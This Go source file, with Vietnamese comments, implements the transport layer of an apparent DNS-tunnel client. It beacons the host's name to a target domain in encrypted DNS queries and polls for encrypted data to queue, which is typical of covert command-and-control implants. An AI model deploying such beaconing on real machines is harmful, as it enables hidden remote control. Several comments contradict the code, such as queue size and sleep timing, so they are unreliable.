package transport

import (
	"ipwf/lib/logging"
	"ipwf/lib/protocol"
	"os"
	"strings"
	"time"
)

// khởi tạo một packetQueue chứa dữ liệu với dung lượng là 100 byte
var packetQueue = make(chan []byte, 1024)

// khởi tạo một chức năng có tên là pollRead với giá trị là stream
func pollRead(stream dnsStream) {

	// thực thi chức năng sendInfoPacket với giá trị là stream
	sendInfoPacket(stream)
	loopCounter := 0
	for {
		// đây là  bộ đếm lùi đến 60s
		time.Sleep(200 * time.Millisecond)
		// Kiểm tra dữ liệu!
		poll(stream)
		loopCounter += 1

		// Gửi sendInfoPacket mỗi 60 giây.
		if loopCounter%300 == 0 {
			sendInfoPacket(stream)
		}
	}
}

func poll(stream dnsStream) {

	// tạo một "polling" request.
	pollQuery := &protocol.Message{
		Clientguid: stream.clientGuid,
		Packet: &protocol.Message_Pollquery{
			Pollquery: &protocol.PollQuery{},
		},
	}
	// khởi tạo hàm pollPacket bằng giá trị của function dnsMarshal
	pollPacket, err := dnsMarshal(pollQuery, stream.encryptionKey, true)

	// kiểm tra nếu có lỗi thì ghi lại một dòng nhật ký
	if err != nil {
		logging.Fatal("Poll marshaling fatal error : %v\n", err)
	}

	// khởi tạo hàm answers bằng giá trị trả về của function sendDNSQuery giá trị 1 là byte của pollPacket
	answers, err := sendDNSQuery([]byte(pollPacket), stream.targetDomain)

	// kiểm tra nếu có lỗi thì ghi lại một dòng nhật ký
	if err != nil {
		logging.Printf("Could not get answer : %v\n", err)
		return
	}

	// kiểm tra mảng answers nếu tổng mảng trong answers trên 0 thì thực thi
	if len(answers) > 0 {
		// khởi tạo packetData bằng cách gộp tất cả mảng trong answers thành giá trị string
		packetData := strings.Join(answers, "")
		// kiểm tra nếu packetData bằng - thì trả lại
		if packetData == ":" {
			return
		}
		// khởi tạo output và complete bằng giá trị giải mã của packetData
		output, complete := Decode(packetData, stream.encryptionKey)

		// kiểm tra nếu thấy complete thì gáng packetQueue bằng output
		if complete {
			packetQueue <- output
		} else {
			// chưa phát hiện nhiều dữ liệu, tiếp tục thu thập dữ liệu cho packetQueue bằng cách tạo vòng lặp poll(stream)
			poll(stream)
		}

	}
}

func sendInfoPacket(stream dnsStream) {
	// khởi tạo name client với giá trị bằng tên của hệ thống
	name, err := os.Hostname()
	//  kiểm tra nếu có lỗi khi gọi chức năng os.Hostname() thì hiển thị ra một lỗi
	if err != nil {
		logging.Println("Could not get hostname.")
		return
	}

	// khởi tạo một infoQuery bằng cách gói các dữ liệu lại dưới đạng protobuf
	infoQuery := &protocol.Message{
		Clientguid: stream.clientGuid,
		Packet: &protocol.Message_Infopacket{
			Infopacket: &protocol.InfoPacket{Hostname: []byte(name)},
		},
	}

	// khởi tạo mã hóa pollPacket bằng giá trị của infoQuery và stream.encryptionKey
	pollPacket, err := dnsMarshal(infoQuery, stream.encryptionKey, true)

	//gọi chức năng sendDNSQuery để gửi dữ liệu đi khi đã mã hóa dữ liệu bằng pollPacket dnsMarshal(infoQuery, stream.encryptionKey, true)
	_, err = sendDNSQuery([]byte(pollPacket), stream.targetDomain)

	// nếu có lỗi thì trả về
	if err != nil {
		return
	}
}
